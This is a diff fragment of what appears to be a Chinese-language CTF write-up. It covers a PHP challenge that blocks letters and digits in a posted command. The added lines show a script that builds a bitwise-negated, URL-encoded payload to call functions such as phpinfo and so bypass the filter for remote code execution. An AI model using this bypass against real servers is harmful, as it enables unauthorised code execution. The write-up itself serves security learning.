@@ -191,3 +191,14 @@ if (isset($_POST['cmd'])) {
 </html>
 ```
 看到源码知道是一个无字母数字RCE。
+我们取反绕过:
+```php
+<?php
+$str = "phpinfo";
+$payload = "";
+for($i=0; $i<strlen($str); $i++){
+    $payload .= urlencode(~$str[$i]);
+}
+echo "(~'$payload')();";
+?>
+```
